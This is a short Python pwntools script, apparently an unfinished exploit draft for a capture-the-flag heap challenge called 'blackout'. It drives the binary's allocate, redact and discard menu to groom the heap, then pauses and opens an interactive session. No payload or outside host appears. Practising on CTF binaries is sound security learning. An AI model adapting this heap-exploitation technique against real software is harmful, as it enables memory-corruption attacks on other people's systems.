#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./blackout", checksec=False)


def start(argv=[], *a, **kw):
    nc = "nc localhost 1337"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}
io = start()


def alloc(idx, sz, data):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"Index: ", str(idx).encode())
    io.sendlineafter(b"Size: ", str(sz).encode())
    io.sendafter(b"String: ", data)


def blackout(idx, data):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"Index: ", str(idx).encode())
    io.sendafter(b"redact: ", data)


def discard(idx):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"Index: ", str(idx).encode())


# sz = 0x4f7
# alloc(0, sz, b"A" * sz)
# alloc(1, sz, b"A" * sz)
# alloc(2, 0x17, b"A" * 0x17)

alloc(0, 0x17, b"A" * 0x17)
alloc(1, 0x17, b"A" * 0x17)
alloc(2, 0x17, b"A" * 0x17)
alloc(3, 0x18, b"A" * 0x18)

discard(0)
discard(2)

pause()
alloc(2, 0x18, b"\n")

io.interactive()
